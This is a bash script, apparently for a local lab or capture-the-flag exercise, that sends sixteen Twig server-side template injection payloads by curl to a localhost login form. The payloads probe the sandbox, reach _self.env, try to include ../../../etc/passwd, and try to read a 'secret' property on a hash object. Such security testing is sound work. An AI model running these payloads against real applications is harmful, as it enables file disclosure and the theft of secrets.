#!/bin/bash

# TWIG SSTI Sandbox Bypass Test Cases
# Target: http://localhost:8081/index.php  
# Objective: Test Twig SSTI in sandbox configuration

TARGET="http://localhost:8081/index.php"

echo "========================================="
echo "Twig SSTI Sandbox Bypass Test Suite"
echo "========================================="
echo ""

# Test 1: Basic SSTI Detection - Mathematical expression
echo "[TEST 1] Basic SSTI Detection - Mathematical expression"
echo "Payload: {{ 7*7 }}"
echo "Expected: If vulnerable, should output 49 instead of literal {{ 7*7 }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ 7*7 }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 2: SSTI with string concatenation
echo "[TEST 2] String expression"
echo "Payload: {{ \"hello\" ~ \" world\" }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ "hello" ~ " world" }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 3: Access _self.env object
echo "[TEST 3] Access Twig environment via _self"
echo "Payload: {{ _self.env }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ _self.env }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 4: Dump function for object inspection
echo "[TEST 4] Using dump() function (allowed in sandbox)"
echo "Payload: {{ dump(_self) }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ dump(_self) }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 5: Attempt to access parent object
echo "[TEST 5] Access parent via _parent"
echo "Payload: {{ _parent }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ _parent }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 6: SET tag injection
echo "[TEST 6] SET tag injection (allowed in sandbox)"
echo "Payload: {% set x=7*7 %}{{ x }}"
curl -s -X POST "$TARGET" \
  -d 'username={% set x=7*7 %}{{ x }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 7: FOR tag injection  
echo "[TEST 7] FOR tag injection (allowed in sandbox)"
echo "Payload: {% for i in range(1,2) %}{{ i }}{% endfor %}"
curl -s -X POST "$TARGET" \
  -d 'username={% for i in range(1,2) %}{{ i }}{% endfor %}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 8: Include tag injection
echo "[TEST 8] INCLUDE tag injection (allowed in sandbox) - potential path traversal"
echo "Payload: {% include \"../../../etc/passwd\" %}"
curl -s -X POST "$TARGET" \
  -d 'username={% include "../../../etc/passwd" %}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 9: Include function injection
echo "[TEST 9] Include function injection (allowed in sandbox)"
echo "Payload: {{ include(\"hello.html.twig\") }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ include("hello.html.twig") }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 10: Constant function abuse
echo "[TEST 10] Constant function abuse"
echo "Payload: {{ constant(\"PHP_VERSION\") }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ constant("PHP_VERSION") }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 11: Cycle function abuse
echo "[TEST 11] Cycle function"
echo "Payload: {{ cycle([\"a\", \"b\", \"c\"]) }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ cycle(["a", "b", "c"]) }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 12: Range function abuse
echo "[TEST 12] Range function"
echo "Payload: {{ range(0,5)|join(\",\") }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ range(0,5)|join(",") }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 13: Object property access - secret property
echo "[TEST 13] Attempt unauthorized property access on RandomHash"
echo "Payload: {{ randomHash.secret }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ randomHash.secret }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 14: Object method access - unauthorized method
echo "[TEST 14] Attempt unauthorized method call"
echo "Payload: {{ randomHash.__construct() }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ randomHash.__construct() }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 15: Bracket notation for method access
echo "[TEST 15] Bracket notation for method/property access"
echo "Payload: {{ randomHash[\"secret\"] }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ randomHash["secret"] }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

# Test 16: Raw filter bypass
echo "[TEST 16] Raw filter bypass"
echo "Payload: {{ \"{{ 7*7 }}\"|raw }}"
curl -s -X POST "$TARGET" \
  -d 'username={{ "{{ 7*7 }}"|raw }}' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  | grep -o "Profile:.*</p>" | head -1
echo ""

echo ""
echo "========================================="
echo "Test suite complete"
echo "========================================="
